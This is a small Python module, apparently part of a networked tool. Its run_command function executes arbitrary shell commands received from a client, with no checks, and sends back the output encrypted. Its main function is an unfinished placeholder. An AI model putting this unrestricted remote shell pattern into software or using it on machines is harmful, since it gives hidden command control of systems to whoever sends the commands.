import subprocess
import sys
from Cryptor import Cryptor

def run_command(commands, client, nickname, cryptor):
    del commands[0:2]
    commands_str = " ".join(commands)

    try:
        output = subprocess.getoutput(commands_str)
    except Exception as e:
        print("Subprocess failed")
        print(e)
        return
    try:
        output_encoded = cryptor.encode(output)
        client.send(output_encoded)
    except Exception as e:
        print("Failed to encode")
        print(e)
        return


def main():
#TODO Tester for run_command
 print("TBA")

if __name__ == "__main__":
    main()
